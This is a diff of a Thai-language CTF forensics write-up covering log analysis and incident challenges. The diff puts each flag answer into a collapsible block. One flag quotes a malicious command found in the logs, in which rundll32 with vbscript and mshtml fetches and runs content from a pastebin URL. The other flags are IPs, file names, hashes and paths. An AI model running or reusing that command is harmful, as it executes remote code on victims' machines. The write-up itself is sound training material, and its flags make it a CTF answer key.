@@ -32,9 +32,11 @@ Format flag: forensic{Full Process Command Line}
 
 แล้วเราก็จะพบกับ command line นี้ในท้ายที่สุด ซึ่งเป็น command ที่ใช้ `rundll32` อะไรก็ตามที่มาจาก pastebin url ด้วย vbscript และ HTA ซึ่งนี่ก็เป็น flag ของข้อแรกนั่นเอง
 
-```
-forensic{rundll32 vbscript:"\\..\\mshtml\\..\\LoL\\..\\mshtml,RunHTMLApplication "+String(CreateObject("Wscript.Shell").Run("https://pastebin.com/raw/nhWeTtJH"),0)}
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>forensic{rundll32 vbscript:"\\..\\mshtml\\..\\LoL\\..\\mshtml,RunHTMLApplication "+String(CreateObject("Wscript.Shell").Run("https://pastebin.com/raw/nhWeTtJH"),0)}</code></pre>
+</details>
+
 ***
 ### Following the Leak Trail #2
 What is the file name?
@@ -50,9 +52,11 @@ Eg. forensic{sample.exe}
 ![b5fb98b354e6e1af6395f704f0f04fa9.png](/resources/b5fb98b354e6e1af6395f704f0f04fa9.png)
 โดย CyberChef ก็จะมี Recipe สำหรับทำ decryption นั่นก็คือ "AES Decrypt" โดยเราจะนำ ciphertext ไปใส่ในช่อง Input และนำ Key กับ IV ไปใส่ในช่องที่กำหนดดังภาพ ซึ่งก็จะได้ผลลัพธ์เป็น base64 string และหลังจาก decode base64 string ก็จะได้เป็นลิงค์ดาวน์โหลดไฟล์สำหรับข้อต่อไปแล้วก็เป็นคำตอบของข้อนี้อีกด้วย
 
-```
-forensic{packet.zip}
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>forensic{packet.zip}</code></pre>
+</details>
+
 ***
 ### Following the Leak Trail #3
 There's something to verify.
@@ -67,9 +71,10 @@ Format flag: forensic{IPAddress}
 
 หลังจาก filter ด้วย `http` เราก็จะพบว่ามีการทำ directory discovery ด้วย dirbuster (ดูได้จาก User-Agent ที่ส่ง request ไปยัง webserver) จาก IP ของ attacker ที่เราหาอยู่นั่นเอง
 
-```
-forensic{192.168.1.116}
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>forensic{192.168.1.116}</code></pre>
+</details>
 
 จบไปแล้วครบกับหมวดของ log analysis งั้นไปต่อกันที่หมวด Incident กันเลย! 
 ***
@@ -87,9 +92,11 @@ Format: forensic{SHA256}
 
 การ checksum มีความสำคัญมากต่อการทำ Digital Forensics ซึ่งจะเป็นการคอนเฟิร์มว่าหลักฐานที่เราได้มานั้นไม่ได้ถูกเปลี่ยนแปลงจากตอนที่ทำการเก็บหลักฐาน (acquisition) 
 
-```
-forensic{6b6ec76ffb5c8922a34e4ef6f4fe39b4e7ebca7e7efe6252dbbe7d4252fc1a1e}
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>forensic{6b6ec76ffb5c8922a34e4ef6f4fe39b4e7ebca7e7efe6252dbbe7d4252fc1a1e}</code></pre>
+</details>
+
 ***
 ### My legacy application was hacked#2
 What OS of affected host? 
@@ -118,9 +125,11 @@ Eg. forensic{Windows_10}
 
 เมื่อเปิดดูก็จะพบว่าหลักฐานทั้งหมดนี้ถูกเก็บมาจากเครื่อง Windows Server 2012 R2 นั่นเอง
 
-```
-forensic{Windows_Server_2012_R2}
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>forensic{Windows_Server_2012_R2}</code></pre>
+</details>
+
 ***
 ### My legacy application was hacked#3
 What is the tool that used for triage acquisition in this incident? 
@@ -128,9 +137,12 @@ What is the tool that used for triage acquisition in this incident?
 Format flag: forensic{TOOL_NAME}
 ***
 ข้อนี้เราได้เฉยไปแล้วในข้อที่แล้ว ข้อข้ามเลยแล้วกันนะครับ
-```
-forensic{KAPE}
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>forensic{KAPE}</code></pre>
+</details>
+
 ***
 ### My legacy application was hacked#4
 What is the specific path of vulnerable web page? 
@@ -167,9 +179,11 @@ Eg. forensic{C:\Windows\system32\test}
 
 แต่! การจะ submit ข้อนี้ให้ได้คะแนนนั้น เราจำเป็นจะต้อง "DOUBLE BACK SLASH" ตรง `C:\xampp` ให้เป็น `C:\\xampp` นั่นเอง
 
-```
-forensic{C:\\xampp\htdocs\cli\index.php}
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>forensic{C:\\xampp\htdocs\cli\index.php}</code></pre>
+</details>
+
 ***
 ### My legacy application was hacked#5
 What is IP of threat actor? 
@@ -181,9 +195,11 @@ Eg. forensic{10.10.10.10}
 
 เรามีอยู่ IP เดียวที่ทำการโจมตีมาที่ endpoint นี้ครับ
 
-```
-forensic{192.168.1.184}
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>forensic{192.168.1.184}</code></pre>
+</details>
+
 ***
 ### My legacy application was hacked#6
 What user was added by the threat actor? 
@@ -215,18 +231,22 @@ Eg. forensic{Alice}
 
 ![68b0347b0cb0f4c013ac1f113be07877.png](/resources/68b0347b0cb0f4c013ac1f113be07877.png)
 
-```
-forensic{systemuser}
-```
+<details>
+  <summary>Answer</summary>
+<pre><code>forensic{systemuser}</code></pre>
+</details>
+
 ***
 ### My legacy application was hacked#7
 When threat actor fully access and control the system?
 
 Format: forensic{DATETIME} 
 Eg. forensic{2022-01-10 11:15}
-```
-forensic{2024-05-09 06:13}
-```
+
+<details>
+  <summary>Answer</summary>
+<pre><code>forensic{2024-05-09 06:13}</code></pre>
+</details>
 
 ![dcc1fcec56ad70de2dddaef79027e812.png](/resources/dcc1fcec56ad70de2dddaef79027e812.png)
 
